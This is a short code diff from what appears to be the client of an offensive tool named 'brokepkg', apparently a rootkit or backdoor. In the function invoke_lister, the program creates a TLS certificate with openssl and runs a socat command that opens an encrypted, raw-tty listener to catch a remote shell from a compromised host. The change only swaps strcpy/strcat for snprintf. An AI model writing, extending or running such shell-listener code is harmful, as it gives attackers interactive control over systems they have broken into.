@@ -38,6 +38,8 @@ void usage(const char *bin_name) {
 }
 
 void invoke_lister(const char *port) {
+  unsigned int len;
+
   if (access("/tmp/brokepkg.pem",
              F_OK)) {  // if "/tmp/brokepkg.pem" not exist
     printf(GOOD ".pem file not exits, creating new\n");
@@ -54,10 +56,13 @@ void invoke_lister(const char *port) {
     system(openssl_create_key);
     system(join_keys);
   }
-  char *socat_lister = malloc((80 + strlen(port)) * sizeof(char));
-  strcpy(socat_lister, "socat file:`tty`,raw,echo=0 openssl-listen:");
-  strcat(socat_lister, port);
-  strcat(socat_lister, ",cert=/tmp/brokepkg.pem,verify=0,fork");
+  len = (81 + strlen(port)) * sizeof(char);
+  char *socat_lister = malloc(len);
+
+  snprintf(socat_lister, len,
+           "socat file:`tty`,raw,echo=0 "
+           "openssl-listen:%s,cert=/tmp/brokepkg.pem,verify=0,fork",
+           port);
 
   if (verbose) {
     printf(DEBUG "socat command:\n%s\n", socat_lister);
